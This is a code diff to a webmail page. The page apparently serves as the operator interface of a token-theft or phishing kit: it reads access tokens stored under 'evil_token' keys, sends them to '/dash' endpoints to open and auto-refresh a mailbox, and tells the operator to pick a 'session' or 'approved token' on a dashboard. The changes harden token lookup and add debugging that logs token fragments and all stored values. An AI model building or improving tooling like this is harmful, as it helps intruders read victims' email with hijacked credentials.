@@ -254,29 +254,45 @@
         let userProfile = null;
         let refreshInterval = null;
 
-        // Try to get token from localStorage (set by dashboard)
+        // =============================================
+        // TOKEN MANAGEMENT — FIXED
+        // =============================================
         function getTokenFromStorage() {
             try {
-                const data = JSON.parse(localStorage.getItem('evil_token'));
-                if (data && data.access_token) {
-                    accessToken = data.access_token;
-                    return true;
-                }
-                // Also try direct token
-                const token = localStorage.getItem('evil_token_direct');
-                if (token) {
+                // 1. Try direct token first
+                let token = localStorage.getItem('evil_token_direct');
+                if (token && token.length > 10) {
                     accessToken = token;
+                    console.log('✅ Token found in evil_token_direct');
                     return true;
                 }
-                // Fallback: prompt user
-                const input = prompt('Enter your access token:', '');
-                if (input && input.length > 10) {
-                    accessToken = input;
-                    localStorage.setItem('evil_token_direct', input);
+                
+                // 2. Try from evil_token object
+                const data = localStorage.getItem('evil_token');
+                if (data) {
+                    try {
+                        const parsed = JSON.parse(data);
+                        if (parsed && parsed.access_token) {
+                            accessToken = parsed.access_token;
+                            console.log('✅ Token found in evil_token object');
+                            return true;
+                        }
+                    } catch (e) {}
+                }
+                
+                // 3. Try from session storage (fallback)
+                const sessionToken = sessionStorage.getItem('evil_token_direct');
+                if (sessionToken && sessionToken.length > 10) {
+                    accessToken = sessionToken;
+                    localStorage.setItem('evil_token_direct', sessionToken);
+                    console.log('✅ Token found in sessionStorage');
                     return true;
                 }
+                
+                console.log('❌ No token found in storage');
                 return false;
             } catch (e) {
+                console.error('Token storage error:', e);
                 return false;
             }
         }
@@ -287,28 +303,34 @@
         async function apiCall(endpoint, method = 'POST', body = null) {
             if (!accessToken) {
                 if (!getTokenFromStorage()) {
-                    alert('No access token found. Please go to the dashboard and select a session.');
-                    return null;
+                    const msg = 'No access token found. Please go to the dashboard and click the Webmail button.';
+                    alert(msg);
+                    throw new Error(msg);
                 }
             }
             const options = {
                 method: method,
-                headers: {
-                    'Content-Type': 'application/json',
-                }
+                headers: { 'Content-Type': 'application/json' }
             };
-            if (body) options.body = JSON.stringify({ accessToken, ...body });
+            const requestBody = { accessToken, ...(body || {}) };
+            options.body = JSON.stringify(requestBody);
+            
+            console.log(`📤 Calling ${endpoint} with token: ${accessToken.slice(0, 20)}...`);
             
             const res = await fetch(`/dash${endpoint}`, options);
             const data = await res.json();
+            
             if (data.error) {
-                if (data.error.includes('expired') || data.error.includes('invalid')) {
+                if (data.error.includes('expired') || data.error.includes('invalid') || data.error.includes('401')) {
+                    document.getElementById('tokenStatus').textContent = '🔑 Token: Expired';
                     alert('Token expired. Please refresh from the dashboard.');
                     accessToken = null;
                     localStorage.removeItem('evil_token');
+                    localStorage.removeItem('evil_token_direct');
                 }
                 throw new Error(data.error);
             }
+            document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
             return data;
         }
 
@@ -587,20 +609,38 @@
         }
 
         // =============================================
-        // INIT
+        // INIT — FIXED
         // =============================================
         async function init() {
+            console.log('🚀 Webmail initializing...');
+            
+            // Debug: Show all localStorage keys
+            console.log('📋 localStorage contents:');
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                console.log(`  ${key}: ${value?.slice(0, 40)}${value?.length > 40 ? '...' : ''}`);
+            }
+            
+            // Try to get token
             if (!getTokenFromStorage()) {
                 document.getElementById('emailList').innerHTML = `
                     <div class="empty-state">
                         <div class="icon">🔑</div>
-                        <p>No access token found</p>
-                        <p style="font-size:12px; margin-top:8px;">
+                        <h3 style="color:#e0e8f0;">No access token found</h3>
+                        <p style="color:rgba(255,255,255,0.5);">
                             Go to the <a href="/dash" style="color:#b388ff;">dashboard</a>, 
-                            select a session, and copy the token.
+                            find your approved token, and click <strong>📧 Webmail</strong>.
+                        </p>
+                        <p style="font-size:12px; margin-top:8px; color:rgba(255,255,255,0.3);">
+                            Or paste a token manually in the console:
+                            <br><code style="background:rgba(255,255,255,0.05);padding:4px 8px;border-radius:4px;">
+                            localStorage.setItem('evil_token_direct', 'YOUR_TOKEN')
+                            </code>
                         </p>
                     </div>
                 `;
+                document.getElementById('tokenStatus').textContent = '🔑 Token: Missing';
                 return;
             }
             
@@ -609,43 +649,16 @@
                 await loadFolder('inbox');
                 startAutoRefresh();
                 document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
+                console.log('✅ Webmail initialized successfully');
             } catch (e) {
                 document.getElementById('statusText').textContent = '❌ Error: ' + e.message;
+                console.error('Init error:', e);
             }
         }
 
-        // Override apiCall to use the token from storage
-        const originalApiCall = apiCall;
-        apiCall = async function(endpoint, method = 'POST', body = null) {
-            if (!accessToken) {
-                if (!getTokenFromStorage()) {
-                    alert('No access token found. Please go to the dashboard and select a session.');
-                    return null;
-                }
-            }
-            const options = {
-                method: method,
-                headers: { 'Content-Type': 'application/json' }
-            };
-            const requestBody = { accessToken, ...(body || {}) };
-            options.body = JSON.stringify(requestBody);
-            
-            const res = await fetch(`/dash${endpoint}`, options);
-            const data = await res.json();
-            if (data.error) {
-                if (data.error.includes('expired') || data.error.includes('invalid') || data.error.includes('401')) {
-                    document.getElementById('tokenStatus').textContent = '🔑 Token: Expired';
-                    alert('Token expired. Please refresh from the dashboard.');
-                    accessToken = null;
-                    localStorage.removeItem('evil_token');
-                    localStorage.removeItem('evil_token_direct');
-                }
-                throw new Error(data.error);
-            }
-            document.getElementById('tokenStatus').textContent = '🔑 Token: Valid';
-            return data;
-        };
-
+        // =============================================
+        // START
+        // =============================================
         init();
     </script>
 </body>
